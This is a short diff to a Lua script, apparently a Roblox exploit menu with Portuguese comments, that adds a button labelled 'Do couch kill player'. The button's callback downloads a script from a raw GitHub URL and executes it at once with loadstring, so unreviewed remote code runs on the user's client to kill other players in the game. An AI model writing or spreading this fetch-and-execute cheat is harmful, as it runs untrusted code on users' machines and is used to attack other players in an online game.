@@ -62,4 +62,11 @@ local Input = YourTab:CreateInput({
             end
         end
     end,
-
+-- Botão para matar o jogador usando o couch
+local Button = Tab:CreateButton({
+    Name = "Do couch kill player",
+    Callback = function()
+        -- Executa o loadstring para o script que você especificou
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Void'))()
+    end,
+})
